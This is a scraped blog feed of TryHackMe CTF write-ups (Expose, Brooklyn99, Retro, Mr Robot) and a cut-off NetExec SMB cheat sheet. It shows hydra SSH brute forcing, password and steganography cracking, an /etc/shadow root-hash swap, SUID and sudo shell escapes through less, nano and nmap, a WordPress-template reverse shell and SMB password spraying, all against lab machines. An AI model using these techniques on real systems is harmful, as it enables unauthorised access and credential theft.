landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:111:1::/var/cache/pollinate:/bin/false ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false mysql:x:113:119:MySQL Server,,,:/nonexistent:/bin/false zeamkish:x:1001:1001:Zeam Kish,1,1,:/home/zeamkish:/bin/bash ftp:x:114:121:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin bind:x:115:122::/var/cache/bind:/usr/sbin/nologin Debian-snmp:x:116:123::/var/lib/snmp:/bin/false redis:x:117:124::/var/lib/redis:/usr/sbin/nologin mosquitto:x:118:125::/var/lib/mosquitto:/usr/sbin/nologin fwupd-refresh:x:119:126:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin /usr/bin/nano /etc/shadow\nI wasn’t able to crack the password, but maybe can just change it.\nI generated the password using\n1 openssl passwd -6 -salt xyz cat And then I replaced the root one:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 root:$6$xyz$SY6bQy3sDajZ0bHnCG35i3R6ykQksyM6FsKDhwWIi6PAr1tmNG2IIkuMaKq.eZtztGCTScNGLxe9Fdzn4CBMK1:7::: daemon:*:18561:0:99999:7::: bin:*:18561:0:99999:7::: sys:*:18561:0:99999:7::: sync:*:18561:0:99999:7::: games:*:18561:0:99999:7::: man:*:18561:0:99999:7::: lp:*:18561:0:99999:7::: mail:*:18561:0:99999:7::: news:*:18561:0:99999:7::: uucp:*:18561:0:99999:7::: proxy:*:18561:0:99999:7::: www-data:*:18561:0:99999:7::: backup:*:18561:0:99999:7::: list:*:18561:0:99999:7::: irc:*:18561:0:99999:7::: gnats:*:18561:0:99999:7::: nobody:*:18561:0:99999:7::: systemd-network:*:18561:0:99999:7::: systemd-resolve:*:18561:0:99999:7::: systemd-timesync:*:18561:0:99999:7::: messagebus:*:18561:0:99999:7::: syslog:*:18561:0:99999:7::: _apt:*:18561:0:99999:7::: tss:*:18561:0:99999:7::: uuidd:*:18561:0:99999:7::: tcpdump:*:18561:0:99999:7::: sshd:*:18561:0:99999:7::: landscape:*:18561:0:99999:7::: pollinate:*:18561:0:99999:7::: ec2-instance-connect:!:18561:0:99999:7::: systemd-coredump:!!:19502:::::: ubuntu:\u0026lt;redacted\u0026gt;:19519:0:99999:7::: lxd:!:19502:::::: mysql:!:19502:0:99999:7::: zeamkish:\u0026lt;redacted\u0026gt;.:19516:0:99999:7::: ftp:*:19519:0:99999:7::: bind:*:19523:0:99999:7::: Debian-snmp:!:19523:0:99999:7::: redis:*:19523:0:99999:7::: mosquitto:*:19523:0:99999:7::: fwupd-refresh:*:19544:0:99999:7::: So now I can su as the root and get the flag in the root directory.\n1 2 3 su root Password: cat root@ip-10-10-108-101:/home/zeamkish# ","date":"2024-01-28T15:00:00Z","image":"https://raw.githubusercontent.com/SimoneFelici/Expose-writeup-THM/main/4ca36771-eb73-4388-a0ae-5541d4fc580b_Export-7a75593e-3439-4e58-bca6-e041ad0479ff/Expose%208862d9d2d64c447b9983bf0fafb7c8f6/Untitled.png","permalink":"https://simonefelici.github.io/p/expose-writeup-thm/","title":"Expose Writeup THM"},{"content":"First of all I am going to start with a nmap scan:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 nmap -sC -sV -p- 10.10.127.58 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-27 13:15 EST Nmap scan report for 10.10.127.58 Host is up (0.064s latency). Not shown: 65532 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_-rw-r--r-- 1 0 0 119 May 17 2020 note_to_jake.txt | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.11.65.91 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 2 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA) | 256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA) |_ 256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: Site doesn\u0026#39;t have a title (text/html). |_http-server-header: Apache/2.4.29 (Ubuntu) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 30.07 seconds We can see that it’s running a ftp server(with anonymous login allowed) and a website on port 80,\nfirstly I am going to check for the ftp server:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 ftp 10.10.127.58 Connected to 10.10.127.58. 220 (vsFTPd 3.0.3) Name (10.10.127.58:kali): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls 229 Entering Extended Passive Mode (|||33749|) 150 Here comes the directory listing. -rw-r--r-- 1 0 0 119 May 17 2020 note_to_jake.txt 226 Directory send OK. ftp\u0026gt; get note_to_jake.txt local: note_to_jake.txt remote: note_to_jake.txt 229 Entering Extended Passive Mode (|||62565|) 150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes). 100% |********************************************************************************************************************************************************************************************| 119 39.55 KiB/s 00:00 ETA 226 Transfer complete. 119 bytes received in 00:00 (2.00 KiB/s) ftp\u0026gt; exit 221 Goodbye. ┌──(kali🔥kali)-[~] └─$ ls Desktop Documents Downloads go hhupd.exe Music note_to_jake.txt pass.txt Pictures Public TCM Templates tools Videos ┌──(kali🔥kali)-[~] └─$ cat note_to_jake.txt From Amy, Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine We can see that there is a note for Jake, maybe this could mean that we should try some brute forcing on Jake’s password.\nNow we also have 3 possible usernames: Amy, Jake, holt.\nBut now I am going to check the site:\nIn the source page there is this message, so i think that I should download the images and check if there is some secrete message:\n1 2 3 4 5 6 stegseek --crack brooklyn99.jpg /usr/share/wordlists/rockyou.txt StegSeek 0.6 - https://github.com/RickdeJager/StegSeek [i] Found passphrase: \u0026#34;\u0026lt;redacted\u0026gt;\u0026#34; [i] Original filename: \u0026#34;note.txt\u0026#34;. [i] Extracting to \u0026#34;brooklyn99.jpg.out\u0026#34;. Apparently there was a note in it.\n1 2 3 4 5 6 cat brooklyn99.jpg.out Holts Password: \u0026lt;redacted\u0026gt; Enjoy!! And I got Holts Password.\nBut we can’t ssh in it.\n1 2 3 4 5 6 7 8 9 10 11 12 ssh holts@10.10.127.58 The authenticity of host \u0026#39;10.10.127.58 (10.10.127.58)\u0026#39; can\u0026#39;t be established. ED25519 key fingerprint is SHA256:ceqkN71gGrXeq+J5/dquPWgcPWwTmP2mBdFS2ODPZZU. This key is not known by any other names. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added \u0026#39;10.10.127.58\u0026#39; (ED25519) to the list of known hosts. holts@10.10.127.58\u0026#39;s password: Permission denied, please try again. holts@10.10.127.58\u0026#39;s password: Permission denied, please try again. holts@10.10.127.58\u0026#39;s password: holts@10.10.127.58: Permission denied (publickey,password). But if I remember jake had a bad password, so I am going to try and brute force ssh with jake:\n1 2 3 4 5 6 7 8 hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.10.127.58 Hydra v9.5 (c) 2023 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-27 13:38:44 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task [DATA] attacking ssh://10.10.127.58:22/ [22][ssh] host: 10.10.127.58 login: jake password: \u0026lt;redacted\u0026gt; And I got jake’s password\n1 2 3 4 5 6 ssh jake@10.10.127.58 jake@10.10.127.58\u0026#39;s password: Last login: Tue May 26 08:56:58 2020 jake@brookly_nine_nine:~$ whoami jake jake@brookly_nine_nine:~$ ls Jake’s directory is empty.\nWe can confirm the usernames:\n1 2 3 4 5 cat /etc/passwd | grep home syslog:x:102:106::/home/syslog:/usr/sbin/nologin amy:x:1001:1001:,,,:/home/amy:/bin/bash holt:x:1002:1002:,,,:/home/holt:/bin/bash jake:x:1000:1000:,,,:/home/jake:/bin/bash Ok, and apparently the name was wrong, it’s actually holt, not holts…\n1 2 3 4 5 ssh holt@10.10.127.58 holt@10.10.127.58\u0026#39;s password: Last login: Tue May 26 08:59:00 2020 from 10.10.10.18 holt@brookly_nine_nine:~$ ls nano.save user.txt So now we got 2 users.\nOk, I actually found 3 ways to get the root flag…\nFirst of all:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 find / -type f -perm -04000 -ls 2\u0026gt;/dev/null 2205 428 -rwsr-xr-x 1 root root 436552 Mar 4 2019 /usr/lib/openssh/ssh-keysign 8400 100 -rwsr-xr-x 1 root root 100760 Nov 23 2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic 7837 108 -rwsr-sr-x 1 root root 109432 Oct 30 2019 /usr/lib/snapd/snap-confine 2209 16 -rwsr-xr-x 1 root root 14328 Mar 27 2019 /usr/lib/policykit-1/polkit-agent-helper-1 2016 44 -rwsr-xr-- 1 root messagebus 42992 Jun 10 2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper 2023 12 -rwsr-xr-x 1 root root 10232 Mar 28 2017 /usr/lib/eject/dmcrypt-get-device 1652 40 -rwsr-xr-x 1 root root 37136 Mar 22 2019 /usr/bin/newgidmap 1653 40 -rwsr-xr-x 1 root root 40344 Mar 22 2019 /usr/bin/newgrp 1690 24 -rwsr-xr-x 1 root root 22520 Mar 27 2019 /usr/bin/pkexec 1654 40 -rwsr-xr-x 1 root root 37136 Mar 22 2019 /usr/bin/newuidmap 1448 76 -rwsr-xr-x 1 root root 76496 Mar 22 2019 /usr/bin/chfn 1795 148 -rwsr-xr-x 1 root root 149080 Jan 31 2020 /usr/bin/sudo 1450 44 -rwsr-xr-x 1 root root 44528 Mar 22 2019 /usr/bin/chsh 1397 52 -rwsr-sr-x 1 daemon daemon 51464 Feb 20 2018 /usr/bin/at 1831 20 -rwsr-xr-x 1 root root 18448 Jun 28 2019 /usr/bin/traceroute6.iputils 1543 76 -rwsr-xr-x 1 root root 75824 Mar 22 2019 /usr/bin/gpasswd 1670 60 -rwsr-xr-x 1 root root 59640 Mar 22 2019 /usr/bin/passwd 66 40 -rwsr-xr-x 1 root root 40152 Jan 27 2020 /snap/core/9066/bin/mount 80 44 -rwsr-xr-x 1 root root 44168 May 7 2014 /snap/core/9066/bin/ping 81 44 -rwsr-xr-x 1 root root 44680 May 7 2014 /snap/core/9066/bin/ping6 98 40 -rwsr-xr-x 1 root root 40128 Mar 25 2019 /snap/core/9066/bin/su 116 27 -rwsr-xr-x 1 root root 27608 Jan 27 2020 /snap/core/9066/bin/umount 2670 71 -rwsr-xr-x 1 root root 71824 Mar 25 2019 /snap/core/9066/usr/bin/chfn 2672 40 -rwsr-xr-x 1 root root 40432 Mar 25 2019 /snap/core/9066/usr/bin/chsh 2748 74 -rwsr-xr-x 1 root root 75304 Mar 25 2019 /snap/core/9066/usr/bin/gpasswd 2840 39 -rwsr-xr-x 1 root root 39904 Mar 25 2019 /snap/core/9066/usr/bin/newgrp 2853 53 -rwsr-xr-x 1 root root 54256 Mar 25 2019 /snap/core/9066/usr/bin/passwd 2963 134 -rwsr-xr-x 1 root root 136808 Jan 31 2020 /snap/core/9066/usr/bin/sudo 3062 42 -rwsr-xr-- 1 root systemd-resolve 42992 Nov 29 2019 /snap/core/9066/usr/lib/dbus-1.0/dbus-daemon-launch-helper 3432 419 -rwsr-xr-x 1 root root 428240 Mar 4 2019 /snap/core/9066/usr/lib/openssh/ssh-keysign 6470 109 -rwsr-xr-x 1 root root 110792 Apr 10 2020 /snap/core/9066/usr/lib/snapd/snap-confine 7646 386 -rwsr-xr-- 1 root dip 394984 Feb 11 2020 /snap/core/9066/usr/sbin/pppd 66 40 -rwsr-xr-x 1 root root 40152 Oct 10 2019 /snap/core/8268/bin/mount 80 44 -rwsr-xr-x 1 root root 44168 May 7 2014 /snap/core/8268/bin/ping 81 44 -rwsr-xr-x 1 root root 44680 May 7 2014 /snap/core/8268/bin/ping6 98 40 -rwsr-xr-x 1 root root 40128 Mar 25 2019 /snap/core/8268/bin/su 116 27 -rwsr-xr-x 1 root root 27608 Oct 10 2019 /snap/core/8268/bin/umount 2665 71 -rwsr-xr-x 1 root root 71824 Mar 25 2019 /snap/core/8268/usr/bin/chfn 2667 40 -rwsr-xr-x 1 root root 40432 Mar 25 2019 /snap/core/8268/usr/bin/chsh 2743 74 -rwsr-xr-x 1 root root 75304 Mar 25 2019 /snap/core/8268/usr/bin/gpasswd 2835 39 -rwsr-xr-x 1 root root 39904 Mar 25 2019 /snap/core/8268/usr/bin/newgrp 2848 53 -rwsr-xr-x 1 root root 54256 Mar 25 2019 /snap/core/8268/usr/bin/passwd 2958 134 -rwsr-xr-x 1 root root 136808 Oct 11 2019 /snap/core/8268/usr/bin/sudo 3057 42 -rwsr-xr-- 1 root systemd-resolve 42992 Jun 10 2019 /snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper 3427 419 -rwsr-xr-x 1 root root 428240 Mar 4 2019 /snap/core/8268/usr/lib/openssh/ssh-keysign 6462 105 -rwsr-sr-x 1 root root 106696 Dec 6 2019 /snap/core/8268/usr/lib/snapd/snap-confine 7636 386 -rwsr-xr-- 1 root dip 394984 Jun 12 2018 /snap/core/8268/usr/sbin/pppd 131867 44 -rwsr-xr-x 1 root root 43088 Jan 8 2020 /bin/mount 131907 44 -rwsr-xr-x 1 root root 44664 Mar 22 2019 /bin/su 131891 64 -rwsr-xr-x 1 root root 64424 Jun 28 2019 /bin/ping 131840 32 -rwsr-xr-x 1 root root 30800 Aug 11 2016 /bin/fusermount 131851 168 -rwsr-xr-x 1 root root 170760 Dec 1 2017 /bin/less 131925 28 -rwsr-xr-x 1 root root 26696 Jan 8 2020 /bin/umount We can see that less has the SUID set.\nthat means that we can use less to read file inside the root folder:\n1 2 3 4 5 6 7 /bin/less /root/root.txt -- Creator : Fsociety2006 -- Congratulations in rooting Brooklyn Nine Nine Here is the flag: 63a9f0ea7bb98050796b649e85481845 Enjoy!! The second one is that holt can use nano has a sudo:\n1 2 3 4 5 6 sudo -l Matching Defaults entries for holt on brookly_nine_nine: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User holt may run the following commands on brookly_nine_nine: (ALL) NOPASSWD: /bin/nano 1 2 3 4 5 6 7 8 9 10 11 12 13 #whoami root cd .. # ls amy holt jake # cd .. # cd root # ls root.txt # cat root.txt -- Creator : Fsociety2006 -- Congratulations in rooting Brooklyn Nine Nine Here is the flag: \u0026lt;redacted\u0026gt; and the last is spawning a shell using jake:\n1 2 3 4 5 6 sudo -l Matching Defaults entries for jake on brookly_nine_nine: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User jake may run the following commands on brookly_nine_nine: (ALL) NOPASSWD: /usr/bin/less 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 sudo /usr/bin/less /etc/profile !/bin/sh # whoami root cd .. # cd root # ls root.txt # cat root.txt -- Creator : Fsociety2006 -- Congratulations in rooting Brooklyn Nine Nine Here is the flag: \u0026lt;redacted\u0026gt; Enjoy!! And that was it, maybe there are other methods to escalate, maybe using Amy, but I think that it’s enough for now.\n","date":"2024-01-27T17:00:00+01:00","image":"https://raw.githubusercontent.com/SimoneFelici/Brooklyn99-writeup-THM/main/13bdc32e-cf3b-45e6-bbd0-66ba5d3eb15b_Export-b06d992f-14fb-47d3-b043-361b15c6baaf/Brooklyn99%2006e08d0fc2c34cefb989749df758fcb4/Untitled.png","permalink":"https://simonefelici.github.io/p/brooklyn99-writeup-thm/","title":"Brooklyn99 Writeup THM"},{"content":"Retro First of all I am going to do an nmap scan:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 nmap -Pn -sC -sV -p- 10.10.185.96 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-23 11:18 EST Nmap scan report for 10.10.185.96 Host is up (0.057s latency). Not shown: 65533 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 |_http-title: IIS Windows Server |_http-server-header: Microsoft-IIS/10.0 | http-methods: |_ Potentially risky methods: TRACE 3389/tcp open ms-wbt-server Microsoft Terminal Services |_ssl-date: 2024-01-23T16:20:36+00:00; -3s from scanner time. | ssl-cert: Subject: commonName=RetroWeb | Not valid before: 2024-01-22T16:18:23 |_Not valid after: 2024-07-23T16:18:23 | rdp-ntlm-info: | Target_Name: RETROWEB | NetBIOS_Domain_Name: RETROWEB | NetBIOS_Computer_Name: RETROWEB | DNS_Domain_Name: RetroWeb | DNS_Computer_Name: RetroWeb | Product_Version: 10.0.14393 |_ System_Time: 2024-01-23T16:20:31+00:00 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: -3s, deviation: 0s, median: -3s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 118.57 seconds Here we can see that it is hosting a web server and accepts rdp connections.\nFirst of all I am goin g to visit the web page:\nThis is the default page of Microsoft IIS.\nNow I am going to start a fuzzer, so we can discover subdirectories:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 ffuf -u \u0026#39;http://10.10.185.96/FUZZ\u0026#39; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://10.10.185.96/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________ retro [Status: 301, Size: 149, Words: 9, Lines: 2, Duration: 194ms] We found the subdirectory “retro”\nLet’s see what’s in there:\nOk, from there we can retrieve a lot of informations, first of all is running wordpress 5.2.1 which is kinda old, so maybe I can find some exploit.\nSecond I found the login page, and we can see that after entering the username “wade” which is the one that is writing the posts, we see that the username exists using a known information disclosure vuln of wp:\nAfter browsing the site I came upon this message:\nI tried to use it as a password and it worked!\nNow we just want to spawn a reverse shell using the dashboard.\nActually, for now we don’t need that. I also tried the credentials with rdp and it worked.\nAnd we can get our fist flag.\nNow, I wanted to use the UAC method to exploit the machine, but I searched and that is bugged, so I used this exploit:\nWe just need to open it and we are root.\n","date":"2024-01-23T17:00:00+01:00","image":"https://raw.githubusercontent.com/Blueaulo/Retro-writeup-THM/main/86aeeb34-ae2f-4bd6-9c9e-4b097945e629_Export-e1ce40fe-b4be-42af-ae4e-bdd7093a35ea/Retro%201d42eb309fba416b8c2ec50ed807d03e/Untitled%201.png","permalink":"https://simonefelici.github.io/p/retro-writeup-thm/","title":"Retro Writeup THM"},{"content":"First of all I am going to do an nmap scan:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 nmap -sC -sV -p- 10.10.81.92 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-22 05:44 EST Nmap scan report for 10.10.81.92 Host is up (0.055s latency). Not shown: 65532 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp closed ssh 80/tcp open http Apache httpd |_http-title: Site doesn\u0026#39;t have a title (text/html). |_http-server-header: Apache 443/tcp open ssl/http Apache httpd |_http-title: Site doesn\u0026#39;t have a title (text/html). |_http-server-header: Apache | ssl-cert: Subject: commonName=www.example.com | Not valid before: 2015-09-16T10:45:03 |_Not valid after: 2025-09-13T10:45:03 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 123.10 seconds Here we can see port 80 and 443 open.\nSo I am going to expplore the web page.\nThis is the content of the web page.\nFrom this point I just went and enumerate the webpage.\nI also found the robots.txt which leads to the first flag.\ninside the robots.txt there is also the location to a dictionary:\n1 sort Downloads/fsocity.dic | uniq \u0026gt; uniq.txt I ran this command because there were repeated words.\nSo, now I just need the username.\nI tried with wpscan but I got nothing, So I tried to FUZZ the username with the sictionary, which if it is in the wordlist, should get a different response size, because wordpress tells you if is just the password that is wrong.\nAnd that’s exactly what happened:\nSo, now I think of running the fuzzer again, with the username Elliot and with the dictionary as a password.\nAnd we got the password:\nAnd I got in, from there I could create a reverse shell, but first let’s explore the dashboard.\nIn the Users section wee see that there is another User:\nMaybe it can be helpful later.\nWe can create a reverse shell just by copy and paste the pentestermonkey reverse shell, in the 404 template.\nThen start the listener in the machine and we are in:\n1 2 3 4 5 6 7 8 9 10 nc -lvnp 4444 listening on [any] 4444 ... connect to [10.11.65.91] from (UNKNOWN) [10.10.81.92] 50199 Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux 12:10:26 up 1:29, 0 users, load average: 0.00, 0.88, 2.66 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=1(daemon) gid=1(daemon) groups=1(daemon) /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ whoami daemon We have 2 users:\n1 2 3 4 5 6 cat /etc/passwd | grep \u0026#34;home\u0026#34; syslog:x:101:104::/home/syslog:/bin/false mysql:x:1001:1001::/home/mysql: varnish:x:999:999::/home/varnish: robot:x:1002:1002::/home/robot: We can’t cd into varnish, but we can cd in robot.\nin his home we have 2 files:\n1 2 3 4 5 6 ls -la total 16 drwxr-xr-x 2 root root 4096 Nov 13 2015 . drwxr-xr-x 3 root root 4096 Nov 13 2015 .. -r-------- 1 robot robot 33 Nov 13 2015 key-2-of-3.txt -rw-r--r-- 1 robot robot 39 Nov 13 2015 password.raw-md5 As we can see the first one can be opened only by robot, but the second one can be read by anyone:\n1 2 cat password.raw-md5 robot:\u0026lt;redacted\u0026gt; And looks like we got the md5 hash of robot\nAnd we can simply brute force it:\n1 2 3 4 5 6 7 8 9 john --format=Raw-md5 pass.txt --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3]) Warning: no OpenMP support for this hash type, consider --fork=4 Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status \u0026lt;redacted\u0026gt; (robot) 1g 0:00:00:00 DONE (2024-01-22 07:19) 100.0g/s 4051Kp/s 4051Kc/s 4051KC/s bonjour1..123092 Use the \u0026#34;--show --format=Raw-MD5\u0026#34; options to display all of the cracked passwords reliably Session completed. Using that we can use the command “su” to authenticate ourself as robot:\n1 2 su robot Password: \u0026lt;redacted\u0026gt; 1 2 whoami robot After doing some enumeration, I noticed that we got a strange SUID:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 find / -type f -perm -04000 -ls 2\u0026gt;/dev/null 15068 44 -rwsr-xr-x 1 root root 44168 May 7 2014 /bin/ping 15093 68 -rwsr-xr-x 1 root root 69120 Feb 12 2015 /bin/umount 15060 96 -rwsr-xr-x 1 root root 94792 Feb 12 2015 /bin/mount 15069 44 -rwsr-xr-x 1 root root 44680 May 7 2014 /bin/ping6 15085 40 -rwsr-xr-x 1 root root 36936 Feb 17 2014 /bin/su 36231 48 -rwsr-xr-x 1 root root 47032 Feb 17 2014 /usr/bin/passwd 36216 32 -rwsr-xr-x 1 root root 32464 Feb 17 2014 /usr/bin/newgrp 36041 44 -rwsr-xr-x 1 root root 41336 Feb 17 2014 /usr/bin/chsh 36038 48 -rwsr-xr-x 1 root root 46424 Feb 17 2014 /usr/bin/chfn 36148 68 -rwsr-xr-x 1 root root 68152 Feb 17 2014 /usr/bin/gpasswd 36349 152 -rwsr-xr-x 1 root root 155008 Mar 12 2015 /usr/bin/sudo 34835 496 -rwsr-xr-x 1 root root 504736 Nov 13 2015 /usr/local/bin/nmap 38768 432 -rwsr-xr-x 1 root root 440416 May 12 2014 /usr/lib/openssh/ssh-keysign 38526 12 -rwsr-xr-x 1 root root 10240 Feb 25 2014 /usr/lib/eject/dmcrypt-get-device 395259 12 -r-sr-xr-x 1 root root 9532 Nov 13 2015 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper 395286 16 -r-sr-xr-x 1 root root 14320 Nov 13 2015 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper 38505 12 -rwsr-xr-x 1 root root 10344 Feb 25 2015 /usr/lib/pt_chown Nmap can be used in interactive mode:\n1 2 3 4 5 6 7 nmap --interactive Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ ) Welcome to Interactive Mode -- press h \u0026lt;enter\u0026gt; for help nmap\u0026gt; !sh # whoami root And after that we just want to go in the /root directory and retrieve the flag.\n","date":"2024-01-22T16:00:00+01:00","image":"https://images.unsplash.com/photo-1582266255765-fa5cf1a1d501?q=80\u0026w=2670\u0026auto=format\u0026fit=crop\u0026ixlib=rb-4.0.3\u0026ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D","permalink":"https://simonefelici.github.io/p/mr-robot-ctf-writeup-thm/","title":"Mr Robot CTF Writeup THM"},{"content":"Enumeration:\n1 nxc smb -h 1 2 nxc smb \u0026lt;URL\u0026gt; SMB \u0026lt;URL\u0026gt; 445 DC-DC [*] Windows 10.0 Build 20348 x64 (name: DC-DC) (domain: dc.local) (signing: True) (SMBv1:False) Name: PC’s name\ndomain: domain’s name\nSMBv1:True (Possible Eternal Blue exploit)\nCheck for acounts:\n1 2 3 4 nxc smb \u0026lt;URL\u0026gt; -u \u0026#39;guest\u0026#39; -p \u0026#39;\u0026#39; SMB \u0026lt;URL\u0026gt; 445 DC-DC [*] Windows 10.0 Build 20348 x64 (name: DC-DC) (domain: dc.local) (signing: True) (SMBv1:False) SMB \u0026lt;URL\u0026gt; 445 DC-DC [-] dc.local\\guest: STATUS_ACCOUNT_DISABLED With a file:\n1 nxc smb \u0026lt;URL\u0026gt; -u \u0026#39;usern.name\u0026#39; -p \u0026#39;password_file.txt\u0026#39; 1 2 3 4 5 SMB \u0026lt;URL\u0026gt; 445 DC-DC [*] Windows 10.0 Build 20348 x64 (name: DC-DC) (domain: dc. local) (signing:True) (SMBv1:False) SMB \u0026lt;URL\u0026gt; 445 DC-DC [-] dc.local\\name.surname:password STATUS_LOGON_FAILURE SMB \u0026lt;URL\u0026gt; 445 DC-DC [-] dc.local\\name.surname:Password123 STATUS_LOGON_FAILURE SMB \u0026lt;URL\u0026gt; 445 DC-DC [-] dc.local\\name.surname:Summer2023! STATUS_LOGON_FAILURE SMB \u0026lt;URL\u0026gt; 445 DC-DC [+] dc. local\\name.surname:SeekTheCheapestRoute! Pass the password:\n1 nxc smb \u0026lt;URL\u0026gt; -u \u0026#39;user_file.txt\u0026#39; -p \u0026#39;\u0026lt;found_password\u0026gt;\u0026#39; With credentials: (enumerate users and groups)\n1 nxc smb \u0026lt;URL\u0026gt; -u \u0026#39;user.name\u0026#39; -p \u0026#39;found_password\u0026#39; --rid-brute With--log you can log a specific command to a specific file\nconfig file:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 /home/kali/.nxc/nxc.conf [nxc] workspace = default last_used_db = smb pwn3d_label = Pwn3d! audit_mode = reveal_chars_of_pwd = 0 log_mode = False \u0026lt;--- if True generates log in the \u0026#34;/home/kali/.nxc/logs\u0026#34; folder ignore_opsec = True host_info_colors = [\u0026#34;green\u0026#34;, \u0026#34;red\u0026#34;, \u0026#34;yellow\u0026#34;, \u0026#34;cyan\u0026#34;] [BloodHound] bh_enabled = False bh_uri = 127.0.0.1 bh_port = 7687 bh_user = neo4j bh_pass = neo4j [Empire] api_host = 127.0.0.1 api_port = 1337 username = empireadmin password = password123 [Metasploit] rpc_host = 127.0.0.1 rpc_port = 55552 password = abc123 Kerberos Auth:\n1 nxc smb \u0026lt;URL\u0026gt; -u \u0026#39;user.name\u0026#39; -p 